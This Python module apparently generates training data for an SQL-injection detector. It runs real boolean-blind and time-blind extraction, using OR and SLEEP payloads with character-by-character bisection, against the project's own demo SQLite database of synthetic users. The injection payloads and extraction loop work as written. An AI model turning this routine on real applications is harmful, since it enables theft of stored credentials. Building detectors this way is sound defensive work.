"""Real boolean-blind / time-blind SQLi extraction against deploy/demo_db.py.

Runs the actual bisection algorithm real sqlmap uses (see the "how does
Branch 3 attack work" research this session) against a real database —
not a guessed/templated approximation. Each probe is a genuine SQL
statement executed by SQLite via `deploy.demo_db.execute_raw()`; the
true/false outcome (row count, or measured elapsed time) comes from real
DBMS behavior, not an assumption about what the DBMS "would" do.

Attack shape, for both attackers:
  1. Bisect on `LENGTH(target_column)` to find the string's length.
  2. For each character position 1..N, bisect on `ASCII(SUBSTR(...))` to
     find that character's code point.
Each bisection step is ~7 requests (ASCII range 32-126 has ~94 values,
ceil(log2(94))=7) — matches the real-world "~7-8 requests per character"
figure from sqlmap's own bisection algorithm.

The injection vector is the same `OR` trick demo_db.py's own "leaked" flag
already assumes: `zzz' OR (<condition>)--` makes every row match when
<condition> is true (since `username='zzz'` never matches, the `OR` is the
only thing determining the row's inclusion), none when false.

Diversity note: the bisection algorithm is deterministic given a target
value, so attacking the same username always produces a byte-identical
trace. deploy/demo_db.py's live Test-page demo only has 5 fixed users —
using it directly here would mean only 5 distinct traces exist no matter
how many "sessions" are generated (confirmed: with 350 sessions/class over
5 usernames, every trace repeats ~70 times, and a model trained on that is
memorizing 5 examples, not learning to generalize). `generate_synthetic_user_pool`
builds a larger, randomized user table used ONLY for training-data
generation, keeping the live demo's fixed 5 rows untouched.
"""

from __future__ import annotations

import random
import string
import time
from dataclasses import dataclass, field

from deploy import demo_db
from src.utils import get_logger

logger = get_logger(__name__)

_PASSWORD_CHARS = string.ascii_letters + string.digits + "!@#$%"


def generate_synthetic_user_pool(n_users: int, rng: random.Random) -> list[tuple[int, str, str, str, str]]:
    """Build a larger, randomized user table for Branch 3 training-data generation.

    Returns rows in the same shape as ``deploy.demo_db._SEED_ROWS``
    (id, username, email, password, role), but with ``n_users`` distinct
    entries and randomized password lengths/content — enough ground-truth
    diversity that bisection traces don't just repeat a handful of fixed
    sequences. Passed to ``deploy.demo_db.execute_raw(..., seed_rows=...)``;
    never touches the live demo's own fixed 5-row table.
    """
    rows = []
    for i in range(1, n_users + 1):
        username = f"user{i:04d}"
        password_len = rng.randint(8, 14)
        password = "".join(rng.choice(_PASSWORD_CHARS) for _ in range(password_len))
        rows.append((i, username, f"{username}@corp.vn", password, "user"))
    return rows


@dataclass
class _BisectionAttacker:
    """Shared real-bisection loop; subclasses only implement the oracle."""

    rng: random.Random
    seed_rows: list[tuple[int, str, str, str, str]] | None = None
    steps: list[dict] = field(default_factory=list)

    def _probe(self, condition_sql: str) -> bool:
        raise NotImplementedError

    def _bisect(self, condition_template: str, low: int, high: int) -> int:
        """Binary search for the exact integer value satisfying the condition.

        Converges to the smallest ``v`` in ``[low, high]`` such that the real
        target value is ``<= v`` (equivalently: the exact target value, given
        the true value lies in range).
        """
        while low < high:
            mid = (low + high) // 2
            if self._probe(condition_template.format(bound=mid)):
                low = mid + 1
            else:
                high = mid
        return low

    def extract(self, target_username: str, target_column: str, max_chars: int, max_len: int = 24) -> str:
        """Run the full real bisection extraction: length, then each character."""
        length_cond = (
            f"(SELECT LENGTH({target_column}) FROM users WHERE username='{target_username}') > {{bound}}"
        )
        real_length = self._bisect(length_cond, 0, max_len)
        n_chars = min(real_length, max_chars)

        chars: list[str] = []
        for pos in range(1, n_chars + 1):
            char_cond = (
                f"(SELECT ASCII(SUBSTR({target_column},{pos},1)) "
                f"FROM users WHERE username='{target_username}') > {{bound}}"
            )
            code = self._bisect(char_cond, 31, 127)
            chars.append(chr(code))
        return "".join(chars)


class BooleanBlindAttacker(_BisectionAttacker):
    """Oracle = whether the injected condition leaked any rows (real row count)."""

    def _probe(self, condition_sql: str) -> bool:
        payload = f"zzz' OR ({condition_sql})--"
        ts = time.time()
        outcome = demo_db.execute_raw(payload, seed_rows=self.seed_rows)
        self.steps.append(_step_dict(outcome["constructed_sql"], ts))
        return outcome["row_count"] > 0


class TimeBlindAttacker(_BisectionAttacker):
    """Oracle = whether the response took measurably longer (real elapsed time)."""

    def __init__(
        self,
        rng: random.Random,
        seed_rows: list[tuple[int, str, str, str, str]] | None = None,
        sleep_seconds: float = 0.05,
    ) -> None:
        super().__init__(rng, seed_rows)
        self.sleep_seconds = sleep_seconds
        self.threshold = sleep_seconds / 2

    def _probe(self, condition_sql: str) -> bool:
        payload = (
            f"zzz' OR (SELECT CASE WHEN ({condition_sql}) "
            f"THEN SLEEP({self.sleep_seconds}) ELSE 0 END)--"
        )
        ts = time.time()
        t0 = time.perf_counter()
        outcome = demo_db.execute_raw(payload, seed_rows=self.seed_rows)
        elapsed = time.perf_counter() - t0
        self.steps.append(_step_dict(outcome["constructed_sql"], ts))
        return elapsed > self.threshold


def _step_dict(constructed_sql: str, timestamp: float) -> dict:
    return {
        "query_raw": constructed_sql,
        "query_canonical": constructed_sql.lower(),
        "timestamp": timestamp,
    }


def run_boolean_blind_session(
    target_username: str,
    target_column: str,
    rng: random.Random,
    max_chars: int,
    seed_rows: list[tuple[int, str, str, str, str]] | None = None,
) -> tuple[list[dict], str]:
    """Run one real boolean-blind extraction session.

    Returns:
        Tuple of (steps, extracted_value) — extracted_value is what the
        bisection actually recovered, for self-verification against the
        real seeded ground truth.
    """
    attacker = BooleanBlindAttacker(rng, seed_rows)
    extracted = attacker.extract(target_username, target_column, max_chars)
    return attacker.steps, extracted


def run_time_blind_session(
    target_username: str,
    target_column: str,
    rng: random.Random,
    max_chars: int,
    sleep_seconds: float = 0.05,
    seed_rows: list[tuple[int, str, str, str, str]] | None = None,
) -> tuple[list[dict], str]:
    """Run one real time-blind extraction session (see run_boolean_blind_session)."""
    attacker = TimeBlindAttacker(rng, seed_rows, sleep_seconds=sleep_seconds)
    extracted = attacker.extract(target_username, target_column, max_chars)
    return attacker.steps, extracted


def run_benign_session(
    rng: random.Random,
    n_steps: int,
    gap_range: tuple[float, float],
    seed_rows: list[tuple[int, str, str, str, str]] | None = None,
) -> list[dict]:
    """Simulate legitimate lookups against the same real DB.

    Real seeded usernames (from ``seed_rows`` if given, else the live demo's
    fixed 5) + a few plausible-but-absent ones, human-paced gaps. There's no
    "attack algorithm" for benign traffic — this is just normal application
    usage against the same real database.
    """
    real_usernames = [row[1] for row in seed_rows] if seed_rows else demo_db.SEED_USERNAMES
    candidates = real_usernames + ["eve", "frank", "grace", "testuser", "guest"]
    steps: list[dict] = []
    ts = time.time()
    for _ in range(n_steps):
        username = rng.choice(candidates)
        outcome = demo_db.execute_raw(username, seed_rows=seed_rows)
        steps.append(_step_dict(outcome["constructed_sql"], ts))
        ts += rng.uniform(*gap_range)
    return steps
